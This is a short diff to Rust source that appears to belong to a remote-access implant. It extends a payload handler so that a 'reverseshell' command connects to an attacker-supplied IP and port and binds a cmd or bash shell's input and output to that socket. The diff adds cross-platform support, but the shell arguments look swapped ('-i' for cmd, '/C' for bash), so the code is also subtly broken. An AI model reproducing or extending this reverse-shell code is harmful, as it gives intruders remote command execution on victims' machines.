@@ -58,17 +58,23 @@ pub fn interpret_payload(payload: String) {
     let infos_payload = payload.split_whitespace().collect::<Vec<_>>();
     if infos_payload[0] == "reverseshell"{
         println!("Activating reverseshell");
-        shell("bash".to_string(), infos_payload[1], infos_payload[2]);
+        if cfg!(target_os = "windows") {
+            shell("cmd".to_string(), infos_payload[1], infos_payload[2], "-i");
+        }
+        else {
+            shell("bash".to_string(), infos_payload[1], infos_payload[2], "/C");
+        }
+        
     }
 }
 
-pub fn shell(shell: String, ip: &str, port: &str) -> Result<()> {
+pub fn shell(shell: String, ip: &str, port: &str, arg: &str) -> Result<()> {
     let sock = reverse_stream::connect(format!("{}:{}", ip, port))?;
     let fd = sock.as_raw_fd();
 
     // Open shell
     Command::new(format!("{}", shell))
-        .arg("-i")
+        .arg(format!("{}", arg))
         .stdin(unsafe { Stdio::from_raw_fd(fd) })
         .stdout(unsafe { Stdio::from_raw_fd(fd) })
         .stderr(unsafe { Stdio::from_raw_fd(fd) })
